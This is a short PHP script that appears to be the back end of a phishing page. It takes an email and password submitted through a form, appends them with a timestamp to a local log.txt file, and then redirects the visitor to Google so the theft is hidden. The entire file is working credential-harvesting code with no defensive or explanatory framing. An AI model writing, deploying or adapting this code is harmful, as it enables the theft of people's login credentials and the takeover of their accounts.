<?php
$email = $_POST['user'];
$password = $_POST['pass'];
$date = date('F j, Y, g:i a');
$data = "Email: $email\nPassword: $password\nDate: $date\n-------------------\n";
file_put_contents('log.txt', $data, FILE_APPEND);
header("Location: https://www.google.com");
exit();
?>
